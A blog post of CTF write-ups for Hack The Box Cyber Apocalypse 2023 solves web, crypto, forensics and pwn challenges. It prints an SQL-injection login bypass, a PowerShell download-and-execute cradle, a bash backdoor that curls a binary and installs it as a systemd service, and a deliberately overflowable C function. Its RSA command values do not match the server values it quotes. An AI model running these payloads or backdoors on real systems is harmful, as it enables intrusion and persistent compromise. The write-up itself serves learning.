---
layout: post
title: "Hack The Box Cyber Apocalypse 2023 - The Cursed Mission Writeups"
date: 2023-03-24 17:12:00 +0530
categories: CTF
tags: ctf hack-the-box cyber-apocalypse 2023
---

Hey there infosec enthusiast, this week I participated in the **Hack The Box Cyber Apocalypse 2023** CTF. The theme for this year CTF was **The Cursed Mission** and it involved aliens. I had a lot of fun while trying to solve the challenges in this CTF. I played solo in this CTF and I as a team ended up at the **1585th** position with a total of **3625** points. I will be sharing my knowledge and the skills that I learned in this writeup. I hope you will also get to learn a lot from this writeup.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/score.png" alt="score">

<br>
<h1><b><u>Web</u></b></h1>

<br>
## Trapped Source

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/trapped_source_1.png" alt="trapped_source">

<br>
In this challenge, we are given a webpage which shows a keypad and we have to bypass this keypad by entering the correct code in order to get the flag. So, the keypad on the website looks like as displayed below.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/trapped_source_2.png" alt="trapped_source">

<br>
Let's checkout the source code of this webpage and see if we can figure out a way to find the code for this keypad.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/trapped_source_3.png" alt="trapped_source">

<br>
As you can see, the code for this keypad is visible in the source code of the webpage. Now, all we have to do is to enter the code into the keypad and fetch the flag.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/trapped_source_4.png" alt="trapped_source">

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/trapped_source_5.png" alt="trapped_source">

> HTB{V13w_50urc3_c4n_b3_u53ful!!!}

<br>
## Gunhead

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/gunhead_1.png" alt="gunhead">

<br>
Here we have to find the flag by exfiltrating the website of a robot. There is a input form in the website and we can run different types of commands in the website command line. Also, we are given source code files for the website as mentioned below.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/gunhead_2.png" alt="gunhead">

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/gunhead_3.png" alt="gunhead">

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/gunhead_4.png" alt="gunhead">

<br>
After reviewing the source code of the website, I found a function which runs the ping command. The interesting thing is that the input is not being sanitized so we can try to run other commands using the **ping** command.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/gunhead_5.png" alt="gunhead">

<br>
First, I tried to run the **ls** command and saw that the command is returing the output. I then started exploring various directories using this ping command and I found a **flag.txt** in the root directory of the website file system.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/gunhead_6.png" alt="gunhead">

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/gunhead_7.png" alt="gunhead">

<br>
I then catted the content of the flag file and I got the flag.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/gunhead_8.png" alt="gunhead">

> HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}

<br>
## Drobots

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/drobots_1.png" alt="drobots">

<br>
In this challenge, we have to compromise a drobots firm. We are given a website which shows the username and password field for logging in to the website. Also, just like the challenge given before we are provided with the source code of the website.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/drobots_2.png" alt="drobots">

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/drobots_3.png" alt="drobots">

<br>
Next, I started to review the source code of the application. I found the code which makes the request for the login when user clicks on the login button.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/drobots_4.png" alt="drobots">

<br>
After visiting the **/api/login** route, I see that there is a **login** function which handles the login by using username and password values.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/drobots_5.png" alt="drobots">

<br>
In the login function, I saw that the **query_db** library function is being used to run the SQL queries and get the user details from the table. So, now I know that there could be SQL injection in this code since the username and password is not being sanitized properly.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/drobots_6.png" alt="drobots">

<br>
So, next I crafted a SQL injection and passed it as the username paramter to the login form.
```
Username: " OR "1"="1" -- 
Password: admin
```

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/drobots_7.png" alt="drobots">

<br>
With the help of the above payload, I was able to login to the website and I got the list of the available robots in the form of the table and our flag for this challenge was in that table.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/drobots_8.png" alt="drobots">

> HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}

<br>
<h1><b><u>Crypto</u></b></h1>

<br>
## Ancient Encodings

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/ancient_encodings_1.png" alt="ancient_encodings">

<br>
In this challenge, we are given two files: **source.py** and **output.txt**. In the **source.py** file, we are given the code which encrypted the flag using various encryption methods including base64. Here is the code for your reference:
```
from Crypto.Util.number import bytes_to_long
from base64 import b64encode

FLAG = b"HTB{??????????}"

def encode(message):
    return hex(bytes_to_long(b64encode(message)))

def main():
    encoded_flag = encode(FLAG)
    with open("output.txt", "w") as f:
        f.write(encoded_flag)

if __name__ == "__main__":
    main()
```

<br>
In the **output.txt** file, we are given the encrypted text of the flag which we have to decode in order to get our flag and solve this challenge.
```
0x53465243657a467558336b7764584a66616a4231636d347a655639354d48566664326b786246397a5a544e66644767784e56396c626d4d775a4446755a334e665a58597a636e6c33614756794d33303d
```

<br>
So, I written my own script in order to find the flag from the above encrypted text. Firstly, I stored the encrypted flag string in a variable. Next, I converted the string to integer then converted integer to bytes using the **long_to_bytes** function of the **Crypto** library. I then decoded these bytes string using the **b64decode** method of the **base64** python library which gives us our flag.
```
from Crypto.Util.number import long_to_bytes
from base64 import b64decode

def decode():
    enc_text = "0x53465243657a467558336b7764584a66616a4231636d347a655639354d48566664326b786246397a5a544e66644767784e56396c626d4d775a4446755a334e665a58597a636e6c33614756794d33303d"
    print(b64decode(long_to_bytes(int(enc_text, 16))))
    
decode()
```

> HTB{1n_y0ur_j0urn3y_y0u_wi1l_se3_th15_enc0d1ngs_ev3rywher3}

<br>
## Small Steps

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/small_steps_1.png" alt="small_steps">

<br>
In this challenge, we have to break a RSA encrption. So, first of all, we are given some scripts in which one of the script is called the **solver.py** and using this script, I connected to the server to get the information that is needed in order to solved this challenge.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/small_steps_2.png" alt="small_steps">

<br>
In the server response, we got some values as mentioned below:
```
N = 10250983065753578599115856381258479229515255149293989765338142532351696063178302167244042181613641478020808017757364166746705859266478050140057833673247287
e = 3
enc_flag = 70407336677212734512904417790364996209303505181058921964048492612496322624631305529219622545852704619786282073843859755376774478843366150337125
```

<br>
Next, I used the [**RSACtfTool**](https://github.com/RsaCtfTool/RsaCtfTool) to decode the RSA encryption using the above values.
```
python RsaCtfTool.py -n 5616270466732426310300260307048235843110520041135755443922426992342272842326999151547603132403264072283295928822923052490335516812826353045712310725435509 -e 3 --uncipher 70407336670535933819674104208890254240063781538460394662998902860952366439176467447947737680952277637330523818962104685553250402512989897886053
```

<br>
By running the above command, our encrypted text is decoded and we got our flag.

> HTB{5ma1l_E-xp0n3nt}

<br>
<h1><b><u>Forensics</u></b></h1>

<br>
## Plaintext Tleasure

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/plaintext_tleasure_1.png" alt="plaintext_tleasure">

<br>
We are given a **pcap** file in this challenge and our objective is to find the admin username and password. Once we get the username and the password, we will also get the flag. So, I opened up the file in the wireshark and searched for the "admin" string in the http protocols. 

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/plaintext_tleasure_2.png" alt="plaintext_tleasure">

<br>
We can see that there two http protocols which contains the **admin** string. So, next I followed the TCP stream of these packets and I saw something interesting.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/plaintext_tleasure_3.png" alt="plaintext_tleasure">

<br>
I finally found the flag that I was searching for.

> HTB{th3s3_4l13ns_st1ll_us3_HTTP}

<br>
## Aien Cradle

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/alien_cradle_1.png" alt="alien_cradle">

<br>
In this challenge, we are given a *Poweshell* executable file called **cradle.ps1**. We have to deobfuscate the code in order to get our flag. I opened up the file in a text editor and after some format cleaning up, this is how the code looked in the file.
```
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth')
{
	exit
};

$w = New-Object net.webclient;
$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');
$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));
$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

<br>
Here, you can see the flag is clearly visible in the variable called **$f** and all we have to do is to join the flag pieces together and we will get our flag.

> HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}

<br>
## Extraterrestrial Persistence

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/extraterrestrial_persistence_1.png" alt="extraterrestrial_persistence">

<br>
Here, we are given a bash file called **persistence.sh** which looked like a backdoor to me. The source code that contains this bash file is mentioned below for your reference:
```
n=`whoami`
h=`hostname`
path='/usr/local/bin/service'
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

curl https://files.pypi-install.com/packeges/service -o $path

chmod +x $path

echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service

systemctl enable service.service
```

<br>
In the above source code, you can see that there is a string encoded in the **base64** which is being written down to the **/usr/lib/systemd/system/service.service** file. So, I think that this encoded string contains our flag.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/extraterrestrial_persistence_2.png" alt="extraterrestrial_persistence">

<br>
After decoding the base64 encoded string, we got our flag in the **Description** variable.

> HTB{th3s3_4l13nS_4r3_s00000_b4s1c}

<br>
<h1><b><u>Misc</u></b></h1>

<br>
## Persistence

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/persistence_1.png" alt="persistence">

<br>
In this challenge, we are given link to a webpage which returns a random string each time we visit the webpage. According to the challenge description, it returns the flag every 1000th request, so its time for automation.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/persistence_2.png" alt="persistence">

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/persistence_3.png" alt="persistence">

<br>
I created a script to send requests to the this webpage server until it returns the flag to me using the python **Requests** library.
```
import requests

flag_url = "http://161.35.168.118:31660/flag"

for _ in range(1010):
	flag_resp = requests.get(flag_url)
	flag_text = flag_resp.text
	print("Request Count:", _, "|", flag_text)

	if "HTB" in flag_text:
		print("\n******************************************\n")
		print(flag_text)

		break
```

<br>
After waiting a while for 190 requests, it returned the flag to me.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/persistence_4.png" alt="persistence">

> HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}

<br>
<h1><b><u>Pwn</u></b></h1>

<br>
## Initialize Connection

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/initialize_conn_1.png" alt="initialize_conn">

<br>
As per the challenge description, we have to start an instance and connect to the server using the **nc** command. Once connected, we have to pass the 1 to the command line prompt in order to get the flag. Pretty simple!

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/initialize_conn_2.png" alt="initialize_conn">

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/initialize_conn_3.png" alt="initialize_conn">

> HTB{g3t_r34dy_f0r_s0m3_pwn}

<br>
## Questionaire

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/questionaire_1.png" alt="questionaire">

<br>
Looks like this challenge is also very simple. All we have to do it to connect to the remote instance using the **Netcat (nc)** command and answer some questions in order to receive the flag. Also, in this challenge, we are given a binary file and we have to answer the questions on the basis of that binary file.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/questionaire_2.png" alt="questionaire">

<br>
I used `file` command in order to answer some of the intial questions such as 64-bit or 32-bit, linking, etc. 

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/questionaire_3.png" alt="questionaire">

Then, I reviewd the source code of the file to answer some questions regarding the binary. Here's the source code of the binary file:
```
#include <stdio.h>
#include <stdlib.h>

/*
This is not the challenge, just a template to answer the questions.
To get the flag, answer the questions. 
There is no bug in the questionnaire.
*/

void gg(){
	system("cat flag.txt");
}

void vuln(){
	char buffer[0x20] = {0};
	fprintf(stdout, "\nEnter payload here: ");
	fgets(buffer, 0x100, stdin);
}

void main(){
	vuln();
}
```

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/questionaire_4.png" alt="questionaire">

<br>
After answering all of the questions correctly, I got the flag for this challenge.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/questionaire_5.png" alt="questionaire">

> HTB{th30ry_bef0r3_4cti0n}

<br>
## Getting Started

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/getting_started_1.png" alt="getting_started">

<br>
Just like the previous pwn challenges, we have to connect to a remote server using the `nc` command and follow instructions in order to get to the flag. The objective of this challenge was to teach and show how the buffer overflow vulnerabilities work in the binaries. After connecting to the server, I am presented with basic information of how the buffer overflows work.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/getting_started_2.png" alt="getting_started">

<br>
Next, I have to overflow the memory of a block by adding random bytes to the block.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/getting_started_3.png" alt="getting_started">

<br>
Once the task is completed, I received the flag.

<br><img src="/assets/images/2023/htb_cyber_apocalypse_ctf/getting_started_4.png" alt="getting_started">

> HTB{b0f_s33m5_3z_r1ght?}

<br>
**I hope you enjoyed this Hack The Box CTF writeup. If you find anything wrong with the writeups or if you wish to understand something, feel free to contact me. Till the next writeup, take care and keep hacking.**